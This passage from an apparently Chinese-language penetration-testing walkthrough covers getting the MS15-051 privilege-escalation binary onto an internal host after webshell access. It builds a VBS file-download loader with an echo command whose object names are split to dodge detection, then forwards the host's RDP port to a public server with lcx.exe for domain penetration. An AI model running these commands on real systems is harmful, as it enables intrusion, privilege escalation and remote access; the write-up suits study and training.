### 内网文件传输

7.  使用ms15-051进行提权。

（1）首先需要将ms15-051.exe传输到内网主机上，因为这里通过冰蝎上传大于30k的文件都会上传失败，这里我们采用内网文件传输方式。

（2）使用如下命令在目标主机上生成vbs脚本：(此处也可以采用其他方式传输)

```
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open ^"get^"
,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> loader.vbs
```

![](../Images/a0dbd8685cea304776d6b7405a76dc34.png)

### 域渗透

1.  因为使用代理连接较慢，这里我们使用lcx.exe在公网服务器，将内网主机3389端口转发到公网主机的8888端口：

（1）先上传lcx.exe文件。

![](../Images/23edd13a97e60383b256d2bf04a8d6ae.png)

（2）使用如下命令正向转发端口：（在公网服务器执行该命令）

lcx.exe -tran 8888 192.168.43.105 3389
